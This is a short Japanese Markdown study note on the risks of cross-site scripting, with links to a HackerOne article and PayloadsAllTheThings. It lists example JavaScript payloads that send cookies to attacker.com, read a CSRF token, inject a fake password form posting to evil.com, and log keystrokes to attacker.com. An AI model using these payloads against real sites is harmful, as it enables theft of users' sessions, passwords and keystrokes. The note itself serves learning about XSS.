## ## 参考サイト
- https://www.hackerone.com/knowledge-center/how-xss-payloads-work-code-examples-and-how-prevent-them

## ## XSSのリスク
- CookieやSessionの窃取
```js
<script>new Image().src="https://attacker.com/cookie.php?cookie="+document.cookie</script>
```
- CSRFの窃取
```js
document.querySelector('[name=csrf]')
```
- フィッシング(偽UI挿入)
```js
document.body.innerHTML = '<form action="http://evil.com"><input name="pass"></form>';
```
- keylogger
	- 入力されたキーを1つずつ攻撃者へ送信する。
```js
document.onkeypress = function(e) {
  fetch("http://attacker.com/log?key=" + e.key);
};
```

---
## ## WordPress
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)